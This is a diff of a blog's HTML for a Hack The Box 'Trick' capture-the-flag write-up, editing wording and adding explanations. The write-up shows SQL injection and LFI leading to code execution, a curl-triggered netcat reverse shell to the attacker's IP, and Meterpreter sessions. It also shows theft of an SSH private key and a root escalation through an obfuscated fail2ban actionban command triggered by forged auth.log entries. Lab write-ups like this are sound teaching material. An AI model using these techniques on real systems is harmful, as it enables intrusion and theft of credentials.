@@ -44,10 +44,10 @@
 
 
   <meta property="og:site_name" content="Security Blog"/>
-  <meta property="og:title" content="HTB - Trick - Writeup"/>
+  <meta property="og:title" content="HTB - Trick - Write-up"/>
   <meta property="og:description" content="Click on &#34;Continue Reading&#34; to activate the password field."/>
   <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="/drafts/htb-trick-writeup.html"/>
+  <meta property="og:url" content="/drafts/htb-trick-write-up.html"/>
   <meta property="og:type" content="article"/>
   <meta property="article:published_time" content="2022-06-20 00:00:00+02:00"/>
   <meta property="article:modified_time" content=""/>
@@ -61,7 +61,7 @@
   <meta property="article:tag" content="#writeup"/>
   <meta property="og:image" content="/images/profile.jpg">
 
-  <title>Security Blog &ndash; HTB - Trick - Writeup</title>
+  <title>Security Blog &ndash; HTB - Trick - Write-up</title>
 
 </head>
 <body class="light-theme">
@@ -117,7 +117,7 @@
 <article class="single">
   <header>
       
-    <h1 id="htb-trick-writeup">HTB - Trick - Writeup</h1>
+    <h1 id="htb-trick-write-up">HTB - Trick - Write-up</h1>
     <p>
       Posted on Mon 20 June 2022 in <a href="/category/htb.html">htb</a>
 
@@ -271,7 +271,7 @@ Certificate:
 </code></pre></div>
 
 <p><strong>NOPE</strong></p>
-<p>Maybe we can resolv an internal domain, guessing <code>trick.htb</code>.</p>
+<p>Maybe we can resolve an internal domain, guessing <code>trick.htb</code>.</p>
 <div class="highlight"><pre><span></span><code>dig A trick.htb @<span class="nv">$TIP</span>
                                                                                                                                                                            <span class="p">;</span> &lt;&lt;&gt;&gt; DiG <span class="m">9</span>.16.1-Ubuntu &lt;&lt;&gt;&gt; A trick.htb @10.129.37.66
 <span class="p">;;</span> global options: +cmd
@@ -319,7 +319,7 @@ trick.htb.              <span class="m">604800</span>  IN      SOA     trick.htb
 </code></pre></div>
 
 <p>There it is, subdomain <code>preprod-payroll.trick.htb</code>.
-nulcei could't find much, nginx, php, ...</p>
+nulcei couldn't find much, nginx, php, ...</p>
 <div class="highlight"><pre><span></span><code>$ ~/go/bin/nuclei -u http://preprod-payroll.trick.htb <span class="p">|</span> tee -a nuclei_http_preprod-payroll.trick.htb.log
 <span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:18<span class="o">]</span> <span class="o">[</span>tech-detect:owl-carousel<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
 <span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:18<span class="o">]</span> <span class="o">[</span>tech-detect:font-awesome<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
@@ -455,7 +455,7 @@ view_employee.php?id<span class="o">=</span>
 voting.php
 </code></pre></div>
 
-<p>We end up with a very nice list. I go with <code>manage_users.php?id=1</code> at very first. Visiting the page we are greated with a nice prefilled form, hoping the password might be in cleartext in the source code.</p>
+<p>We end up with a very nice list. I go with <code>manage_users.php?id=1</code> at very first. Visiting the page we are greeted with a nice prefilled form, hoping the password might be in cleartext in the source code.</p>
 <p>And yesssss, we are lucky.</p>
 <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;container-fluid&quot;</span><span class="p">&gt;</span>
 
@@ -574,8 +574,38 @@ available databases [2]:
         root /var/www/payroll<span class="p">;</span>
 </code></pre></div>
 
-<p>Ok, two vhosts the already known <code>preprod-payroll.trick.htb</code> and the yet unknown host <code>preprod-marketing.trick.htb</code>.
-Aaaand now we might read webserver files using the SQL injection?
+<p>Ok, two vhosts the already known <code>preprod-payroll.trick.htb</code> and the yet unknown host <code>preprod-marketing.trick.htb</code>.</p>
+<h2>Alternative way: vhost Fuzzing</h2>
+<div class="highlight"><pre><span></span><code>$ ~/go/bin/ffuf -w SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt  -u http://preprod-payroll.trick.htb  -H <span class="s2">&quot;HOST: preprod-FUZZ.trick.htb&quot;</span> -fs <span class="m">5480</span>
+
+        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\</span>
+       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
+       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\</span>
+        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\</span>
+          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
+
+       v1.5.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://preprod-payroll.trick.htb
+ :: Wordlist         : FUZZ: SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: preprod-FUZZ.trick.htb
+ :: Follow redirects : <span class="nb">false</span>
+ :: Calibration      : <span class="nb">false</span>
+ :: Timeout          : <span class="m">10</span>
+ :: Threads          : <span class="m">40</span>
+ :: Matcher          : Response status: <span class="m">200</span>,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: <span class="m">5480</span>
+________________________________________________
+
+marketing               <span class="o">[</span>Status: <span class="m">200</span>, Size: <span class="m">9660</span>, Words: <span class="m">3007</span>, Lines: <span class="m">179</span>, Duration: 26ms<span class="o">]</span>
+payroll                 <span class="o">[</span>Status: <span class="m">302</span>, Size: <span class="m">9546</span>, Words: <span class="m">1453</span>, Lines: <span class="m">267</span>, Duration: 38ms<span class="o">]</span>
+:: Progress: <span class="o">[</span><span class="m">114441</span>/114441<span class="o">]</span> :: Job <span class="o">[</span><span class="m">1</span>/1<span class="o">]</span> :: <span class="m">1262</span> req/sec :: Duration: <span class="o">[</span><span class="m">0</span>:01:34<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+</code></pre></div>
+
+<p>Aaaand now we might read webserver files using the SQL injection?
 In the very first file we read <code>index.php</code> we find a possible <strong>File Inclusion</strong> vulnerability.</p>
 <div class="highlight"><pre><span></span><code><span class="x">--------snip---------</span>
 <span class="x">  &lt;main id=&quot;view-panel&quot; &gt;</span>
@@ -737,14 +767,7 @@ In the very first file we read <code>index.php</code> we find a possible <strong
 </code></pre></div>
 
 <p>Ok, we can read files using SQL injection and we can read files using Local File inclusion, but maybe we can gain RCE using the PHP File Inclusion. We use the SQL injection to write a simple PHP file to <code>/tmp/</code> and then include it using the LFI.</p>
-<div class="highlight"><pre><span></span><code>msf6 exploit(multi/handler) &gt; run -j
-[*] Exploit running as background job 3.
-[*] Exploit completed, but no session was created.
-
-[*] Started reverse TCP handler on 10.10.14.8:4444
-msf6 exploit(multi/handler) &gt; [*] Command shell session 6 opened (10.10.14.8:4444 -&gt; 10.10.11.166:50756) at 2022-07-04 15:54:36 +0200
-
-msf6 exploit(multi/handler) &gt; show options
+<div class="highlight"><pre><span></span><code>msf6 exploit(multi/handler) &gt; show options
 
 Module options (exploit/multi/handler):
 
@@ -770,7 +793,14 @@ Exploit target:
 msf6 exploit(multi/handler) &gt; run
 
 [*] Started reverse TCP handler on 10.10.14.8:4444
-[*] Command shell session 2 opened (10.10.14.8:4444 -&gt; 10.10.11.166:42224) at 2022-06-26 08:27:25 +0200
+</code></pre></div>
+
+<p>We trigger the reverse shell using the PHP LFI RCE</p>
+<div class="highlight"><pre><span></span><code>curl <span class="s1">&#39;http://preprod-payroll.trick.htb/index.php?page=/tmp/phpcmd&amp;cmd=nc 10.10.14.8 4444 -e /usr/bin/bash&#39;</span> --silent
+</code></pre></div>
+
+<p>Shortly after msfconsole received the connection</p>
+<div class="highlight"><pre><span></span><code>[*] Command shell session 2 opened (10.10.14.8:4444 -&gt; 10.10.11.166:42224) at 2022-06-26 08:27:25 +0200
 
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -811,45 +841,8 @@ msf6 post(multi/manage/shell_to_meterpreter) &gt; run
 [*] Meterpreter session 3 opened (10.10.14.8:4433 -&gt; 10.10.11.166:44914) at 2022-06-26 08:28:03 +0200
 [*] Command stager progress: 100.00% (773/773 bytes)
 [*] Post module execution completed
-msf6 post(multi/manage/shell_to_meterpreter) &gt;
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code>curl <span class="s1">&#39;http://preprod-payroll.trick.htb/index.php?page=/tmp/phpcmd&amp;cmd=nc 10.10.14.8 4444 -e /usr/bin/bash&#39;</span> --silent
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code>msf6 post(multi/manage/shell_to_meterpreter) &gt; show options
-
-Module options (post/multi/manage/shell_to_meterpreter):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
-   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
-   LPORT    4433             yes       Port for payload to connect to.
-   SESSION  2                yes       The session to run this module on
-
-msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i
-
-Active sessions
-===============
-
-  Id  Name  Type             Information  Connection
-  --  ----  ----             -----------  ----------
-  6         shell sparc/bsd               10.10.14.8:4444 -&gt; 10.10.11.166:50756 (10.10.11.166)
-
-msf6 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 6
-SESSION =&gt; 6
-msf6 post(multi/manage/shell_to_meterpreter) &gt; run
-
-[*] Upgrading session ID: 6
-[*] Starting exploit/multi/handler
-[*] Started reverse TCP handler on 10.10.14.8:4433
-[*] Sending stage (989032 bytes) to 10.10.11.166
-[*] Meterpreter session 7 opened (10.10.14.8:4433 -&gt; 10.10.11.166:58138) at 2022-07-04 15:56:42 +0200
-[*] Command stager progress: 100.00% (773/773 bytes)
-[*] Post module execution completed
-msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 7
-[*] Starting interaction with 7...
+msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 3
+[*] Starting interaction with 3...
 
 meterpreter &gt; sysinfo
 Computer     : 10.10.11.166
@@ -859,9 +852,8 @@ BuildTuple   : i486-linux-musl
 Meterpreter  : x86/linux
 meterpreter &gt; getuid
 Server username: www-data
-</code></pre></div>
 
-<div class="highlight"><pre><span></span><code>meterpreter &gt; ls
+meterpreter &gt; ls
 Listing: /var/www
 =================
 
@@ -887,11 +879,12 @@ else{
 ?&gt;
 </code></pre></div>
 
-<p>Another LFI</p>
+<p>Clearly, this is another LFI. Let's give it a try and see what user we are by executing <code>id</code>.</p>
 <div class="highlight"><pre><span></span><code><span class="o">(</span>venv3<span class="o">)</span> root@pwnbox:~/venv3/htb/trick# curl <span class="s2">&quot;preprod-marketing.trick.htb/index.php?page=....//....//....//tmp/phpcmd.php&amp;cmd=id&quot;</span>
 <span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span>,1002<span class="o">(</span>security<span class="o">)</span>
 </code></pre></div>
 
+<p>Ok, we aren't <code>www-data</code> anymore, but user <code>michael</code> instead. Fast forward, by using the new LFI/RCE we walk through the filesystem and find michael's private SSH key.</p>
 <div class="highlight"><pre><span></span><code><span class="o">(</span>venv3<span class="o">)</span> root@pwnbox:~/venv3/htb/trick# curl preprod-marketing.trick.htb/index.php?page<span class="o">=</span>....//....//....//home/michael/.ssh/id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
@@ -922,6 +915,7 @@ jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
 -----END OPENSSH PRIVATE KEY-----
 </code></pre></div>
 
+<p>With that key, we can connect using SSH. Noteable the user can use sudo to restart fail2ban and is part of the security group which can write to the <code>/etc/fail2ban/action.d/</code> directory.</p>
 <div class="highlight"><pre><span></span><code>ssh -i id_rsa_michael michael@<span class="nv">$TIP</span>
 Linux trick <span class="m">4</span>.19.0-20-amd64 <span class="c1">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span>
 
@@ -947,6 +941,8 @@ drwxr-xr-x <span class="m">6</span> root root      <span class="m">4096</span> J
 ...
 </code></pre></div>
 
+<p>We can't edit the files in <code>action.d</code> in place, but copy, edit, overwrite/delete. By inserting an own <code>actionban</code> command, we can execute commands as <code>root</code> user.
+With the python script below, we read the <code>/root/root.txt</code> flag and create a server listening on port 35345, printing back the flag to the first client.</p>
 <div class="highlight"><pre><span></span><code># Option:  actioncheck
 # Notes.:  command executed once before each actionban command
 # Values:  CMD
@@ -962,6 +958,21 @@ actioncheck = &lt;iptables&gt; -n -L &lt;chain&gt; | grep -q &#39;f2b-&lt;name&g
 actionban = python3 -c &#39;exec(&quot;\nimport socket\nd=lambda istr: bytes.fromhex(hex(istr)[2:]).decode()\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.bind((d(13561583350328880),35345))\ns.listen(5)\nc,a=s.accept()\nc.sendall(open(d(962339749473780545853982382520436), d(29282)).read())\n&quot;)&#39;
 </code></pre></div>
 
+<p>The editing and applying works like this:</p>
+<div class="highlight"><pre><span></span><code>cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/im.conf.tmp
+# vim /tmp/im.conf.tmp
+sed -i &quot;s/&lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;/python \-c &#39;exec\(\&quot;\\\nimport socket\\\nd\=lambda istr\: bytes\.fromhex\(hex\(istr\)\[2\:\]\)\.decode\(\)\\\ns\=socket\.socket\(socket\.AF_INET,socket\.SOCK_STREAM\)\\\ns\.setsockopt\(socket\.SOL_SOCKET, socket\.SO_REUSEADDR, 1\)\\\ns\.bind\(\(d\(13561583350328880\),35345\)\)\\\ns\.listen\(5\)\\\nc,a\=s\.accept\(\)\\\nc\.sendall\(open\(d\(962339749473780545853982382520436\), d\(29282\)\)\.read\(\)\)\\\n\&quot;\)&#39;/g&quot; /tmp/im.conf.tmp
+cp -f /tmp/im.conf.tmp /etc/fail2ban/action.d/iptables-multiport.conf
+sudo /etc/init.d/fail2ban restart
+</code></pre></div>
+
+<p>We force copy the edited file and restart the service. The next step is to trigger the <strong>ban</strong>. We could connect with SSH multiple times using wrong passwords, but I found a more convenient way without using SSH. fail2ban evaluates the <code>/var/log/auth.log</code> and we can insert own entries, even as low privilege user, using the <code>logger</code> command.
+Example:</p>
+<div class="highlight"><pre><span></span><code>logger --tag sshd --id=1337 -p auth.info &#39;Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+</code></pre></div>
+
+<p>Execute that multiple times.
+As root, we can read <code>/var/log/auth.log</code> showing the "failed" login attempts.</p>
 <div class="highlight"><pre><span></span><code>root@trick:~# grep sshd /var/log/auth.log | tail -n 50
 Jul  4 16:07:06 trick sshd[736]: Server listening on 0.0.0.0 port 22.
 Jul  4 16:07:06 trick sshd[736]: Server listening on :: port 22.
@@ -981,6 +992,7 @@ Jul  4 16:11:16 trick sshd[1337]: Failed password for invalid user root from 192
 Jul  4 16:11:18 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
 </code></pre></div>
 
+<p>fail2ban evaluate those login attempts and executes the ban command.</p>
 <div class="highlight"><pre><span></span><code>2022-07-04 16:10:46,002 fail2ban.server         [1556]: INFO    Starting Fail2ban v0.10.2
 2022-07-04 16:10:46,005 fail2ban.database       [1556]: INFO    Connected to fail2ban persistent database &#39;/var/lib/fail2ban/fail2ban.sqlite3&#39;
 2022-07-04 16:10:46,006 fail2ban.jail           [1556]: INFO    Creating new jail &#39;sshd&#39;
@@ -1003,38 +1015,12 @@ Jul  4 16:11:18 trick sshd[1337]: Failed password for invalid user root from 192
 2022-07-04 16:11:16,080 fail2ban.actions        [1556]: NOTICE  [sshd] Ban 192.192.192.192
 </code></pre></div>
 
-<hr>
-<h2>snip</h2>
-<h1>Vhost Fuzzing</h1>
-<div class="highlight"><pre><span></span><code>$ ~/go/bin/ffuf -w SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt  -u http://preprod-payroll.trick.htb  -H <span class="s2">&quot;HOST: preprod-FUZZ.trick.htb&quot;</span> -fs <span class="m">5480</span>
-
-        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\</span>
-       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
-       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\</span>
-        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
-         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\</span>
-          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
-
-       v1.5.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://preprod-payroll.trick.htb
- :: Wordlist         : FUZZ: SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt
- :: Header           : Host: preprod-FUZZ.trick.htb
- :: Follow redirects : <span class="nb">false</span>
- :: Calibration      : <span class="nb">false</span>
- :: Timeout          : <span class="m">10</span>
- :: Threads          : <span class="m">40</span>
- :: Matcher          : Response status: <span class="m">200</span>,204,301,302,307,401,403,405,500
- :: Filter           : Response size: <span class="m">5480</span>
-________________________________________________
-
-marketing               <span class="o">[</span>Status: <span class="m">200</span>, Size: <span class="m">9660</span>, Words: <span class="m">3007</span>, Lines: <span class="m">179</span>, Duration: 26ms<span class="o">]</span>
-payroll                 <span class="o">[</span>Status: <span class="m">302</span>, Size: <span class="m">9546</span>, Words: <span class="m">1453</span>, Lines: <span class="m">267</span>, Duration: 38ms<span class="o">]</span>
-:: Progress: <span class="o">[</span><span class="m">114441</span>/114441<span class="o">]</span> :: Job <span class="o">[</span><span class="m">1</span>/1<span class="o">]</span> :: <span class="m">1262</span> req/sec :: Duration: <span class="o">[</span><span class="m">0</span>:01:34<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+<p>Now we try to connect to port 35345.</p>
+<div class="highlight"><pre><span></span><code>$ nc <span class="m">127</span>.0.0.1 <span class="m">35345</span>
+AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQ
 </code></pre></div>
 
+<p>Done. We got the root flag. We could have also spawned a reverse root shell, but wasn't necessary.</p>
 <p>Here is the all in one PoC to pwn the machine.</p>
 <div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 <span class="kn">import</span> <span class="nn">logging</span>
